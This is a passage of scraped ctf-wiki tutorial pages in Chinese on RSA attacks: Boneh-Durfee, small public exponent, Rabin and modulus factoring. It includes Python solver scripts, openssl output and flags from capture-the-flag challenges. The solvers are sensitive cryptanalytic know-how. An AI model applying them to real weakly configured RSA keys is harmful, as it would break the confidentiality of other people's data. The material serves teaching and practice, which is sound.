x00\\x00t\\x04\\x00j\\x0c\\x00|\\t\\x00|\\x06\\x00\\x83\\x02\\x00}\\x0b\\x00t\\x04\\x00j\\x0b\\x00|\\x0b\\x00|\\x06\\x00\\x83\\x02\\x00d\\x05\\x00k\\x03\\x00r\\xca\\x01q\\xc6\\x00n\\x00\\x00Pq\\xc6\\x00Wd\\n\\x00}\\x0c\\x00|\\x03\\x00|\\x0b\\x00f\\x02\\x00S'\n>>> t[6:26]\n'd\\x01\\x00d\\x02\\x00\\x15\\x00\\x00\\x00\\x00\\x01\\x00d\\x02\\x00\\x15}\\x00\\x00'\n>>> t[-3:]\n'\\x02\\x00S'\n>>> t='d\\x01\\x00d\\x02\\x00\\x15\\x00\\x00\\x00\\x00\\x01\\x00d\\x02\\x00\\x15}\\x00\\x00'\n>>> t[-3:]\n'}\\x00\\x00'\n>>> t[:7]+t[-3:]\n'd\\x01\\x00d\\x02\\x00\\x15}\\x00\\x00'\n>>> _.encode('hex')\n'640100640200157d0000'\n```\n\n从而我们可以修复原 code\n\n```python\n>>> data.find('640100')\n56\n>>> data1=data[:56]+'640100640200157d0000640100640200157d0000'+data[56+40:]\n>>> code1=marshal.loads(data1.decode('hex'))\n>>> code_deparse(code1)\nif False:\n    x = 7 / 0\n    x = 7 / 0\nNsize = NSIZE\npqsize = Nsize / 2\nN = 0\nwhile N.bit_length() != Nsize:\n    while True:\n        p = number.getStrongPrime(pqsize)\n        q = number.getStrongPrime(pqsize)\n        if abs(p - q).bit_length() > Nsize * 0.496:\n            break\n\n    N = p * q\n\nphi = (p - 1) * (q - 1)\nlimit1 = 0.261\nlimit2 = 0.293\nwhile True:\n    d = number.getRandomRange(pow(2, int(Nsize * limit1)), pow(2, int(Nsize * limit1) + 1))\n    while d.bit_length() < Nsize * limit2:\n        ppp = 0\n        while not number.isPrime(ppp):\n            ppp = number.getRandomRange(pow(2, 45), pow(2, 45) + pow(2, 12))\n\n        d *= ppp\n\n    if number.GCD(d, phi) != 1:\n        continue\n    e = number.inverse(d, phi)\n    if number.GCD(e, phi) != 1:\n        continue\n    break\n\nzzz = 3\nreturn (\n N, e)<uncompyle6.semantics.pysource.SourceWalker object at 0x10a0ea110>\n```\n\n可以看到生成的 d 是故意超了 0.292 的，不过我们可以发现 ppp 范围很小，实际上我们可以测试得到这个范围的素数为 125 个。并且\n\n```python\n1280*0.261+45=379.08000000000004>375.03999999999996=1280*0.293\n```\n\n所以其实这里就乘了一个数，那么我们其实就可以枚举一下乘了什么，并修改 e1=e*ppp，其实就回归到标准的 Boneh and Durfee attack。\n\n但是，如果我们直接使用 https://github.com/mimoo/RSA-and-LLL-attacks 的脚本也不行，必须得提高 m，基本得提到 8，这样仍然不是很稳定。\n\n如果仔细尝试尝试的话，就会发现 e1>N，这看起来问题不大，但是原脚本里假设的数值是 e<N 的，所以我们需要进行适当的修改预估的上下界\n\n```python\n    X = 2*floor(N^delta)  # this _might_ be too much\n    Y = floor(N^(1/2))    # correct if p, q are ~ same size\n```\n\n根据上述推导，上下界应该为\n\n$|k|<\\frac{2ed}{\\varphi(N)}<\\frac{3ed}{N}=3*\\frac{e}{N}*d<3*\\frac{e}{N}*N^{delta}$\n\n$|y|<2*N^{0.5}$\n\n最后主要修改了 m 和 X 的上界\n\n```python\n    delta = .262 # this means that d < N^delta\n\n    #\n    # Lattice (tweak those values)\n    #\n\n    # you should tweak this (after a first run), (e.g. increment it until a solution is found)\n    m = 8 # size of the lattice (bigger the better/slower)\n\n    # you need to be a lattice master to tweak these\n    t = int((1-2*delta) * m)  # optimization from Herrmann and May\n    X = floor(3*e/N*N^delta) #4*floor(N^delta)  # this _might_ be too much\n    Y = floor(2*N^(1/2))    # correct if p, q are ~ same size\n```\n\n最后可以得到结果\n\n```shell\n[DEBUG] Received 0x1f bytes:\n    'Succcess!\\n'\n    'OOO{Br3akingL!mits?}\\n'\nOOO{Br3akingL!mits?}\n```\n\n不得不说这个题目，真的是需要**多**核服务器。。\n\n\n## 参考资料\n\n- Survey: Lattice Reduction Attacks on RSA\n- An Introduction to Coppersmith’s method and Applications in Cryptology\n", "timestamp": "2025-10-21T22:02:48.639296"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/asymmetric/rsa/rsa_e_attack.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/asymmetric/rsa/rsa_e_attack.md", "content": "# 公钥指数相关攻击\n\n## 小公钥指数攻击\n\n### 攻击条件\n\ne 特别小，比如 e 为 3。\n\n### 攻击原理\n\n假设用户使用的密钥 $e=3$。考虑到加密关系满足：\n\n$$\nc\\equiv m^3 \\bmod N\n$$\n\n则：\n\n$$\n\\begin{align*}\nm^3 &= c+k\\times N\\\\\nm &= \\sqrt[3]{c+k\\times n}\n\\end{align*}\n$$\n\n攻击者可以从小到大枚举 $k$，依次开三次根，直到开出整数为止。\n\n### 范例\n\n这里我们以 XMan 一期夏令营课堂练习为例进行介绍（Jarvis OJ 有复现），附件中有一个 `flag.enc` 和 `pubkey.pem`，很明显是密文和公钥了，先用 `openssl` 读一下公钥。\n\n```bash\n➜  Jarvis OJ-Extremely hard RSA git:(master) ✗ openssl rsa -pubin -in pubkey.pem -text -modulus       \nPublic-Key: (4096 bit)\nModulus:\n    00:b0:be:e5:e3:e9:e5:a7:e8:d0:0b:49:33:55:c6:\n    18:fc:8c:7d:7d:03:b8:2e:40:99:51:c1:82:f3:98:\n    de:e3:10:45:80:e7:ba:70:d3:83:ae:53:11:47:56:\n    56:e8:a9:64:d3:80:cb:15:7f:48:c9:51:ad:fa:65:\n    db:0b:12:2c:a4:0e:42:fa:70:91:89:b7:19:a4:f0:\n    d7:46:e2:f6:06:9b:af:11:ce:bd:65:0f:14:b9:3c:\n    97:73:52:fd:13:b1:ee:a6:d6:e1:da:77:55:02:ab:\n    ff:89:d3:a8:b3:61:5f:d0:db:49:b8:8a:97:6b:c2:\n    05:68:48:92:84:e1:81:f6:f1:1e:27:08:91:c8:ef:\n    80:01:7b:ad:23:8e:36:30:39:a4:58:47:0f:17:49:\n    10:1b:c2:99:49:d3:a4:f4:03:8d:46:39:38:85:15:\n    79:c7:52:5a:69:98:4f:15:b5:66:7f:34:20:9b:70:\n    eb:26:11:36:94:7f:a1:23:e5:49:df:ff:00:60:18:\n    83:af:d9:36:fe:41:1e:00:6e:4e:93:d1:a0:0b:0f:\n    ea:54:1b:bf:c8:c5:18:6c:b6:22:05:03:a9:4b:24:\n    13:11:0d:64:0c:77:ea:54:ba:32:20:fc:8f:4c:c6:\n    ce:77:15:1e:29:b3:e0:65:78:c4:78:bd:1b:eb:e0:\n    45:89:ef:9a:19:7f:6f:80:6d:b8:b3:ec:d8:26:ca:\n    d2:4f:53:24:cc:de:c6:e8:fe:ad:2c:21:50:06:86:\n    02:c8:dc:dc:59:40:2c:ca:c9:42:4b:79:00:48:cc:\n    dd:93:27:06:80:95:ef:a0:10:b7:f1:96:c7:4b:a8:\n    c3:7b:12:8f:9e:14:11:75:16:33:f7:8b:7b:9e:56:\n    f7:1f:77:a1:b4:da:ad:3f:c5:4b:5e:7e:f9:35:d9:\n    a7:2f:b1:76:75:97:65:52:2b:4b:bc:02:e3:14:d5:\n    c0:6b:64:d5:05:4b:7b:09:6c:60:12:36:e6:cc:f4:\n    5b:5e:61:1c:80:5d:33:5d:ba:b0:c3:5d:22:6c:c2:\n    08:d8:ce:47:36:ba:39:a0:35:44:26:fa:e0:06:c7:\n    fe:52:d5:26:7d:cf:b9:c3:88:4f:51:fd:df:df:4a:\n    97:94:bc:fe:0e:15:57:11:37:49:e6:c8:ef:42:1d:\n    ba:26:3a:ff:68:73:9c:e0:0e:d8:0f:d0:02:2e:f9:\n    2d:34:88:f7:6d:eb:62:bd:ef:7b:ea:60:26:f2:2a:\n    1d:25:aa:2a:92:d1:24:41:4a:80:21:fe:0c:17:4b:\n    98:03:e6:bb:5f:ad:75:e1:86:a9:46:a1:72:80:77:\n    0f:12:43:f4:38:74:46:cc:ce:b2:22:2a:96:5c:c3:\n    0b:39:29\nExponent: 3 (0x3)\nModulus=B0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAsL7l4+nlp+jQC0kzVcYY\n/Ix9fQO4LkCZUcGC85je4xBFgOe6cNODrlMRR1ZW6Klk04DLFX9IyVGt+mXbCxIs\npA5C+nCRibcZpPDXRuL2BpuvEc69ZQ8UuTyXc1L9E7Huptbh2ndVAqv/idOos2Ff\n0NtJuIqXa8IFaEiShOGB9vEeJwiRyO+AAXutI442MDmkWEcPF0kQG8KZSdOk9AON\nRjk4hRV5x1JaaZhPFbVmfzQgm3DrJhE2lH+hI+VJ3/8AYBiDr9k2/kEeAG5Ok9Gg\nCw/qVBu/yMUYbLYiBQOpSyQTEQ1kDHfqVLoyIPyPTMbOdxUeKbPgZXjEeL0b6+BF\nie+aGX9vgG24s+zYJsrST1MkzN7G6P6tLCFQBoYCyNzcWUAsyslCS3kASMzdkycG\ngJXvoBC38ZbHS6jDexKPnhQRdRYz94t7nlb3H3ehtNqtP8VLXn75NdmnL7F2dZdl\nUitLvALjFNXAa2TVBUt7CWxgEjbmzPRbXmEcgF0zXbqww10ibMII2M5HNro5oDVE\nJvrgBsf+UtUmfc+5w4hPUf3f30qXlLz+DhVXETdJ5sjvQh26Jjr/aHOc4A7YD9AC\nLvktNIj3betive976mAm8iodJaoqktEkQUqAIf4MF0uYA+a7X6114YapRqFygHcP\nEkP0OHRGzM6yIiqWXMMLOSkCAQM=\n-----END PUBLIC KEY-----\n```\n\n看到 $e=3$，很明显是小公钥指数攻击了。这里我们使用 Crypto 库来读取公钥，使用 multiprocessing 来加快破解速度。\n\n```python\n#/usr/bin/python\n# coding=utf-8\nimport gmpy2\nfrom Crypto.PublicKey import RSA\nfrom multiprocessing import Pool\npool = Pool(4)\n\nwith open('./pubkey.pem', 'r') as f:\n    key = RSA.importKey(f)\n    N = key.n\n    e = key.e\nwith open('flag.enc', 'r') as f:\n    cipher = f.read().encode('hex')\n    cipher = int(cipher, 16)\n\n\ndef calc(j):\n    print j\n    a, b = gmpy2.iroot(cipher + j * N, 3)\n    if b == 1:\n        m = a\n        print '{:x}'.format(int(m)).decode('hex')\n        pool.terminate()\n        exit()\n\n\ndef SmallE():\n    inputs = range(0, 130000000)\n    pool.map(calc, inputs)\n    pool.close()\n    pool.join()\n\n\nif __name__ == '__main__':\n    print 'start'\n    SmallE()\n```\n\n爆破时间有点长，，拿到 flag\n\n```\nDidn't you know RSA padding is really important? Now you see a non-padding message is so dangerous. And you should notice this in future.Fl4g: flag{Sm4ll_3xpon3nt_i5_W3ak}\n```\n\n### 题目\n\n## RSA 衍生算法——Rabin 算法\n\n### 攻击条件\n\nRabin 算法的特征在于 $e=2$。\n\n### 攻击原理\n\n密文：\n\n$$\nc = m^2\\bmod n\n$$\n\n解密：\n\n- 计算出 $m_p$ 和 $m_q$：\n\n$$\n\\begin{align*}\nm_p &= \\sqrt{c} \\bmod p\\\\\nm_q &= \\sqrt{c} \\bmod q\n\\end{align*}\n$$\n\n- 用扩展欧几里得计算出 $y_p$ 和 $y_q$：\n\n$$\ny_p \\cdot p + y_q \\cdot q = 1\n$$\n\n- 解出四个明文：\n\n$$\n\\begin{align*}\na &= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\\nb &= n - a\\\\\nc &= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\\nd &= n - c\n\\end{align*}\n$$\n\n注意：如果 $p \\equiv q \\equiv 3 \\pmod 4$，则\n\n$$\n\\begin{align*}\nm_p &= c^{\\frac{1}{4}(p + 1)} \\bmod p\\\\\nm_q &= c^{\\frac{1}{4}(q + 1)} \\bmod q\n\\end{align*}\n$$\n\n而一般情况下，$p \\equiv q \\equiv 3 \\pmod 4$ 是满足的，对于不满足的情况下，请参考相应的算法解决。\n\n### 例子\n\n这里我们以 XMan 一期夏令营课堂练习（Jarvis OJ 有复现）为例，读一下公钥。\n\n```bash\n➜  Jarvis OJ-hard RSA git:(master) ✗ openssl rsa -pubin -in pubkey.pem -text -modulus \nPublic-Key: (256 bit)\nModulus:\n    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:\n    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:\n    be:30:dd\nExponent: 2 (0x2)\nModulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr\nyigb/+l/vjDdAgEC\n-----END PUBLIC KEY-----\n```\n\n$e=2$，考虑 Rabin 算法。首先我们先分解一下 p 和 q，得到\n\n```text\np=275127860351348928173285174381581152299\nq=319576316814478949870590164193048041239\n```\n\n编写代码\n\n```python\n#!/usr/bin/python\n# coding=utf-8\nimport gmpy2\nimport string\nfrom Crypto.PublicKey import RSA\n\n# 读取公钥参数\nwith open('pubkey.pem', 'r') as f:\n    key = RSA.importKey(f)\n    N = key.n\n    e = key.e\nwith open('flag.enc', 'r') as f:\n    cipher = f.read().encode('hex')\n    cipher = string.atoi(cipher, base=16)\n    # print cipher\nprint \"please input p\"\np = int(raw_input(), 10)\nprint 'please input q'\nq = int(raw_input(), 10)\n# 计算yp和yq\ninv_p = gmpy2.invert(p, q)\ninv_q = gmpy2.invert(q, p)\n\n# 计算mp和mq\nmp = pow(cipher, (p + 1) / 4, p)\nmq = pow(cipher, (q + 1) / 4, q)\n\n# 计算a,b,c,d\na = (inv_p * p * mq + inv_q * q * mp) % N\nb = N - int(a)\nc = (inv_p * p * mq - inv_q * q * mp) % N\nd = N - int(c)\n\nfor i in (a, b, c, d):\n    s = '%x' % i\n    if len(s) % 2 != 0:\n        s = '0' + s\n    print s.decode('hex')\n```\n\n拿到 flag，`PCTF{sp3ci4l_rsa}`。\n\n### 题目\n", "timestamp": "2025-10-21T22:02:48.758366"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/asymmetric/rsa/rsa_module_attack.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/asymmetric/rsa/rsa_module_attack.md", "content": "# 模数相关攻击\n\n## 暴力分解 N\n\n### 攻击条件\n\n在 N 的比特位数小于 512 的时候，可以采用大整数分解的策略获取 p 和 q。\n\n### JarvisOJ - Easy RSA\n\n这里我们以 \"JarvisOJ - Easy RSA\" 为例进行介绍，题目如下\n\n> 还记得 veryeasy RSA 吗？是不是不难？那继续来看看这题吧，这题也不难。  \n> 已知一段 RSA 加密的信息为：0xdc2eeeb2782c 且已知加密所用的公钥：  \n> N=322831561921859 e = 23  \n> 请解密出明文，提交时请将数字转化为 ascii 码提交  \n> 比如你解出的明文是 0x6162，那么请提交字符串 ab  \n> 提交格式：`PCTF{明文字符串}`\n\n可以看出，我们的 N 比较小，这里我们直接使用 factordb 进行分解，可以得到\n\n$$\n322831561921859 = 13574881 \\times 23781539\n$$\n\n进而我们简单编写程序如下\n\n```python\nimport gmpy2\np = 13574881\nq = 23781539\nn = p * q\ne = 23\nc = 0xdc2eeeb2782c\nphin = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phin)\np = gmpy2.powmod(c, d, n)\ntmp = hex(p)\nprint tmp, tmp[2:].decode('hex')\n```\n\n结果如下\n\n```shell\n➜  Jarvis OJ-Basic-easyRSA git:(master) ✗ python exp.py\n0x33613559 3a5Y\n```\n\n## p & q 不当分解 N\n\n### 攻击条件\n\n当 RSA 中 p 和 q 选取不当时，我们也可以进行攻击。\n\n### |p-q| 很大\n\n当 p-q 很大时，一定存在某一个参数较小，这里我们假设为 p，那么我们可以通过穷举的方法对模数进行试除，从而分解模数，得到保密参数与明文信息。基本来说，不怎么可行。\n\n### |p-q| 较小\n\n首先\n\n$$\n\\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4}\n$$\n\n既然 |p-q| 较小，那么 $\\frac{(p-q)^2}{4}$ 自然也比较小，进而 $\\frac{(p+q)^2}{4}$ 只是比 N 稍微大一点，所以 $\\frac{p+q}{2}$ 与 $\\sqrt{n}$ 相近。那么我们可以按照如下方法来分解\n\n- 顺序检查 $\\sqrt{n}$ 的每一个整数 x，直到找到一个 x 使得 $x^2-n$ 是平方数，记为 $y^2$\n- 那么 $x^2-n=y^2$，进而根据平方差公式即可分解 N\n\n### p - 1 光滑\n\n* 光滑数(Smooth number)：指可以分解为小素数乘积的正整数\n\n* 当$p$是$N$的因数，并且$p-1$是光滑数，可以考虑使用`Pollard's p-1`算法来分解$N$\n\n* 根据费马小定理有\n\n    $$若p\\nmid a,\\ 则a^{p-1}\\equiv 1\\pmod{p}$$\n\n    则有\n\n    $$a^{t(p-1)}\\equiv 1^t \\equiv 1\\pmod{p}$$\n\n    即\n\n    $$a^{t(p-1)} - 1 = k*p$$\n\n* 根据`Pollard's p-1`算法：\n\n    如果$p$是一个$B-smooth\\ number$，那么则存在\n\n    $$M = \\prod_{q\\le{B}}{q^{\\lfloor\\log_q{B}\\rfloor}}$$\n\n    使得\n\n    $$(p-1)\\mid M$$\n    \n    成立，则有\n\n    $$\\gcd{(a^{M}-1, N)}$$\n    \n    如果结果不为$1$或$N$，那么就已成功分解$N$。\n\n    因为我们只关心最后的gcd结果，同时`N`只包含两个素因子，则我们不需要计算$M$，考虑$n=2,3,\\dots$，令$M = n!$即可覆盖正确的$M$同时方便计算。\n\n* 在具体计算中，可以代入降幂进行计算\n\n    $$\n    a^{n!}\\bmod{N}=\\begin{cases}\n        (a\\bmod{N})^2\\mod{N}&n=2\\\\\n        (a^{(n-1)!}\\bmod{N})^n\\mod{N}&n\\ge{3}\n    \\end{cases}$$\n\n* Python代码实现\n\n    ```python\n    from gmpy2 import *\n    a = 2\n    n = 2\n    while True:\n        a = powmod(a, n, N)\n        res = gcd(a-1, N)\n        if res != 1 and res != N:\n            q = N // res\n            d = invert(e, (res-1)*(q-1))\n            m = powmod(c, d, N)\n            print(m)\n            break\n        n += 1\n    ```\n\n### p + 1 光滑\n\n* 当$p$是$N$的因数，并且$p+1$是光滑数，可以考虑使用`Williams's p+1`算法来分解$N$\n\n* 已知$N$的因数$p$，且$p+1$是一个光滑数\n\n    $$\n    p = \\left(\\prod_{i=1}^k{q_i^{\\alpha_i}}\\right)+1\n    $$\n\n    $q_i$即第$i$个素因数且有$q_i^{\\alpha_i}\\le B_1$, 找到$\\beta_i$使得让$q_i^{\\beta_i}\\le B_1$且$q_i^{\\beta_i+1}> B_1$，然后令\n\n    $$\n    R = \\prod_{i=1}^k{q_i^{\\beta_i}}\n    $$\n\n    显然有$p-1\\mid R$且当$(N, a) = 1$时有$a^{p-1}\\equiv 1 \\pmod{p}$，所以有$a^R\\equiv 1\\pmod{p}$，即\n\n    $$\n        p\\mid(N, a^R-1)\n    $$\n\n* 令$P,Q$为整数，$\\alpha,\\beta$为方程$x^2-Px+Q=0$的根，定义如下类卢卡斯序列\n\n    $$\n    \\begin{aligned}\n        U_n(P, Q) &= (\\alpha^n -\\beta^n)/(\\alpha - \\beta)\\\\\n        V_n(P, Q) &= \\alpha^n + \\beta^n\n    \\end{aligned}\n    $$\n\n    同样有$\\Delta = (\\alpha - \\beta)^2 = P^2-4Q$，则有\n\n    $$\n    \\begin{cases}\n        U_{n+1} &= PU_n - QU_{n-1}\\\\\n        V_{n+1} &= PV_n - QV_{n-1}\n    \\end{cases}\\tag{2.2}\n    $$\n\n    $$\n    \\begin{cases}\n        U_{2n} &= V_nU_n\\\\\n        V_{2n} &= V_n^2 - 2Q^n\n    \\end{cases}\\tag{2.3}\n    $$\n\n    $$\n    \\begin{cases}\n        U_{2n-1} &= U_n^2 - QU_{n-1}^2\\\\\n        V_{2n-1} &= V_nV_{n-1} - PQ^{n-1}\n    \\end{cases}\\tag{2.4}\n    $$\n\n    $$\n    \\begin{cases}\n        \\Delta U_{n} &= PV_n - 2QV_{n-1}\\\\\n        V_{n} &= PU_n - 2QU_{n-1}\n    \\end{cases}\\tag{2.5}\n    $$\n\n    $$\n    \\begin{cases}\n        U_{m+n} &= U_mU_{n+1} - QU_{m-1}U_n\\\\\n        \\Delta U_{m+n} &= V_mV_{n+1} - QV_{m-1}V_n\n    \\end{cases}\\tag{2.6}\n    $$\n\n    $$\n    \\begin{cases}\n        U_{n}(V_k(P, Q), Q^k) &= U_{nk}(P, Q)/U_k(P, Q)\\\\\n        V_{n}(V_k(P, Q), Q^k) &= V_n(P, Q)\n    \\end{cases}\\tag{2.7}\n    $$\n\n    同时我们有如果$(N, Q) = 1$且$P^{'}Q\\equiv P^2-2Q\\pmod{N}$，则有$P^{'}\\equiv \\alpha/\\beta + \\beta/\\alpha$以及$Q^{'}\\equiv \\alpha/\\beta + \\beta/\\alpha = 1$，即\n\n    $$\n    U_{2m}(P, Q)\\equiv PQ^{m-1}U_m(P^{'}, 1)\\pmod{N}\\tag{2.8}\n    $$\n\n    根据扩展卢卡斯定理\n    >如果p是奇素数，$p\\nmid Q$且勒让德符号$(\\Delta/p) = \\epsilon$，则\n\n    $$\n    \\begin{aligned}\n    U_{(p-\\epsilon)m}(P, Q) &\\equiv 0\\pmod{p}\\\\\n    V_{(p-\\epsilon)m}(P, Q) &\\equiv 2Q^{m(1-\\epsilon)/2}\\pmod{p}    \n    \\end{aligned}\n    $$\n\n* `第一种情况`：已知N的因数p，且p+1是一个光滑数\n\n    $$\n    p = \\left(\\prod_{i=1}^k{q_i^{\\alpha_i}}\\right)-1\n    $$\n\n    有$p+1\\mid R$，当$(Q, N)=1$且$(\\Delta/p) = -1$时有$p\\mid U_R(P, Q)$，即$p\\mid (U_R(P, Q), N)$\n\n    为了找到$U_R(P, Q)$，`Guy`和`Conway`提出可以使用如下公式\n\n    $$\n    \\begin{aligned}\n        U_{2n-1} &= U_n^2 - QU_n^2 - 1\\\\\n        U_{2n} &= U_n(PU_n - 2QU_{n-1})\\\\\n        U_{2n+1} &= PU_{2n} - QU_{2n-1}\n    \\end{aligned}\n    $$\n\n    但是上述公式值太大了，不便运算，我们可以考虑如下方法\n\n    如果$p \\mid U_R(P, 1)$，根据`公式2.3`有$p\\mid U_{2R}(P, Q)$，所以根据`公式2.8`有$p \\mid U_R(P^{'}, 1)$，设$Q=1$，则有\n\n    $$\n    V_{(p-\\epsilon)m}(P, 1) \\equiv 2\\pmod{p}\n    $$\n\n    即，如果$p\\mid U_R(P, 1)$，则$p\\mid(V_R(P, 1) -2)$.\n\n    第一种情况可以归纳为：\n\n    让$R = r_1r_2r_3\\cdots r_m$，同时找到$P_0$使得$(P_0^2-4, N) = 1$，定义$V_n(P) = V_n(P, 1), U_n(P) = U_n(P, 1)$且\n\n    $$\n    P_j \\equiv V_{r_j}(P_{j-1})\\pmod{N}(j = 1,2,3,\\dots,m)\n    $$\n\n    根据`公式2.7`，有\n\n    $$\n    P_m \\equiv V_R(P_0)\\pmod{N}\\tag{3.1}\n    $$\n\n    要计算$V_r = V_r(P)$可以用如下公式\n    \n    根据`公式2.2`，`公式2.3`，`公式2.4`有\n\n    $$\n    \\begin{cases}\n        V_{2f-1}&\\equiv V_fV_{f-1}-P\\\\\n        V_{2f}&\\equiv V_f^2 - 2\\\\\n        V_{2f+1}&\\equiv PV_f^2-V_fV_{f-1}-P\\pmod(N)\n    \\end{cases}\n    $$\n\n    令\n\n    $$\n    r = \\sum_{i=0}^t{b_t2^{t-i}}\\ \\ \\ \\ (b_i=0,1)\n    $$\n    \n    $f_0=1, f_{k+1}=2f_k+b_{k+1}$，则$f_t=r$，同样$V_0(P) = 2, V_1(P) = P$，则最终公式为\n\n    $$\n    (V_{f_{k+1}}, V_{f_{k+1}-1}) = \\begin{cases}\n    (V_{2f_k}, V_{2f_k-1})\\ \\ \\ \\ if\\ b_{k+1}=0\\\\\n    (V_{2f_k+1}, V_{2f_k})\\ \\ \\ \\ if\\ b_{k+1}=1\n    \\end{cases}\n    $$\n\n* `第二种情况`：已知p+1是一个光滑数\n\n    $$\n    p = s\\left(\\prod_{i=1}^k{q_i^{\\alpha_i}}\\right)-1\n    $$\n\n    当$s$是素数，且$B_1<s\\le B_2$，有$p\\mid(a_m^s-1, N)，$定义$s_j$和$2d_j$\n    \n    $$\n    2d_j = s_j+1-s_j\n    $$\n    \n    如果$(\\Delta/p) = -1$且$p\\nmid P_m-2$，则根据`公式2.7`和`公式3.1`有$p\\mid(U_s(P_m), N)$。\n\n    令$U[n] \\equiv U_n(P_m), V[n]\\equiv V_n(P_m)\\pmod{N}$，计算$U[2d_j-1], U[2d_j], U[2d_j+1]$通过\n\n    $$U[0] = 0, U[1] = 1, U[n+1] = P_mU[n] - U[n-1]$$\n\n    计算\n\n    $$\n    T[s_i] \\equiv \\Delta U_{s_i}(P_m) = \\Delta U_{s_iR}(P_0)/U_R(P_0)\\pmod{N}\n    $$\n\n    通过`公式2.6`，`公式2.7`和`公式3.1`有\n\n    $$\n    \\begin{cases}\n        T[s_1]&\\equiv P_mV[s_1]-2V[s_1-1]\\\\\n        T[s_1-1]&\\equiv 2V[s_1]-P_mV[s_1-1]\\pmod{N}\n    \\end{cases}\n    $$\n\n    即\n\n    $$\n    \\begin{cases}\n        T[s_{i+1}]&\\equiv T[s_i]U[2d_i+1]-T[s_i-1]U[2d_i]\\\\\n        T[s_{i+1}-1]&\\equiv T[s_i]U[2d_i]-T[s_i-1]U[2d_i-1]\\pmod{N}\n    \\end{cases}\n    $$\n\n    计算$T[s_i], i=1,2,3\\dots$，然后计算\n\n    $$\n    H_t = (\\prod_{i=0}^c{T[s_{i+t}], N})\n    $$\n\n    其中$t = 1, c+1, 2c+1, \\dots, c[B_2/c]+1$，我们有$p\\mid H_i$当$(\\Delta/p)=-1$\n\n* python代码实现\n\n    ```python\n    def mlucas(v, a, n):\n        \"\"\" Helper function for williams_pp1().  Multiplies along a Lucas sequence modulo n. \"\"\"\n        v1, v2 = v, (v**2 - 2) % n\n        for bit in bin(a)[3:]: v1, v2 = ((v1**2 - 2) % n, (v1*v2 - v) % n) if bit == \"0\" else ((v1*v2 - v) % n, (v2**2 - 2) % n)\n        return v1\n    \n    for v in count(1):\n        for p in primegen():\n            e = ilog(isqrt(n), p)\n            if e == 0: break\n            for _ in xrange(e): v = mlucas(v, p, n)\n            g = gcd(v-2, n)\n            if 1 < g < n: return g # g|n\n            if g == n: break\n    ```\n\n### 2017 SECCON very smooth\n\n该程序给了一个 HTTPS 加密的流量包，首先从其中拿到证书\n\n```shell\n➜  2017_SECCON_verysmooth git:(master) binwalk -e s.pcap      \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n2292          0x8F4           Certificate in DER format (x509 v3), header length: 4, sequence length: 467\n4038          0xFC6           Certificate in DER format (x509 v3), header length: 4, sequence length: 467\n5541          0x15A5          Certificate in DER format (x509 v3), header length: 4, sequence length: 467\n\n➜  2017_SECCON_verysmooth git:(master) ls\ns.pcap  _s.pcap.extracted  very_smooth.zip\n```\n\n这里分别查看三个证书，三个模数都一样，这里只给一个例子\n\n```\n➜  _s.pcap.extracted git:(master) openssl x509 -inform DER -in FC6.crt  -pubkey -text -modulus -noout \n-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy\n8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYj\nDUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQl\nyioxCqbXYIMxGO4NcQIDAQAB\n-----END PUBLIC KEY-----\nCertificate:\n    Data:\n        Version: 1 (0x0)\n        Serial Number: 11640506567126718943 (0xa18b630c7b3099df)\n    Signature Algorithm: sha256WithRSAEncryption\n        Issuer: C=JP, ST=Kawasaki, O=SRL\n        Validity\n            Not Before: Oct  8 02:47:17 2017 GMT\n            Not After : Oct  8 02:47:17 2018 GMT\n        Subject: C=JP, ST=Kawasaki, O=SRL\n        Subject Public Key Info:\n            Public 